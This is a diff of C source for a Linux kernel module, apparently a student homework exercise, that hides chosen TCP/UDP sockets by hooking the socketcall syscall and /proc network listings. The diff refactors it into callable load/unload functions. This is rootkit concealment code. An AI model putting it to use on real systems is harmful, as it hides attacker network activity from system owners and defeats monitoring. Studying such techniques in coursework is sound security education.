@@ -19,11 +19,13 @@ typedef asmlinkage long (*fun_long_int_unsigned_long)(int, unsigned long __user*
 fun_long_int_unsigned_long orig_socketcall;
 
 
-int port_to_hide;
-MODULE_PARM_DESC(port_to_hide, "Port to hide.");
-module_param(port_to_hide, int, 0000);
-char* prot_to_hide;
-module_param(prot_to_hide, charp, 0000);
+int port_to_hide = -1;
+char* prot_to_hide = "";
+
+int socketToHide(char *protocol, int port){
+    prot_to_hide = protocol;
+    port_to_hide = port;
+}
 
 
 static int hooked_udp_show(struct seq_file* file, void* v){
@@ -76,7 +78,7 @@ asmlinkage long hooked_socketcall(int call, unsigned long __user* args){
     return orig_socketcall(call, args);
 }
 
-void hide_sockets(void){
+void load_sockethiding(void){
     struct proc_dir_entry *p = init_net.proc_net->subdir;
     struct tcp_seq_afinfo *tcp_seq = 0;
     struct udp_seq_afinfo *udp_seq = 0;
@@ -103,7 +105,7 @@ void hide_sockets(void){
     syscall_table[__NR_socketcall] = hooked_socketcall;
 }
 
-void unhide_sockets(void){
+void unload_sockethiding(void){
     struct proc_dir_entry *p = init_net.proc_net->subdir;
     struct tcp_seq_afinfo *tcp_seq = 0;
     struct udp_seq_afinfo *udp_seq = 0;
@@ -126,24 +128,3 @@ void unhide_sockets(void){
     syscall_table = (void**) ptr_sys_call_table;
     syscall_table[__NR_socketcall] = orig_socketcall;
 }
-
-/* Initialization routine */
-static int __init _init_module(void)
-{
-    printk(KERN_INFO "This is the kernel module of gruppe 6, homework 6.\n");
-    hide_sockets();
-
-    return 0;
-}
-
-/* Exiting routine */
-static void __exit _cleanup_module(void)
-{
-    unhide_sockets();
-    printk(KERN_INFO "Gruppe 6 says goodbye.\n");
-}
-
-
-/* Declare init and exit routines */
-module_init(_init_module);
-module_exit(_cleanup_module);
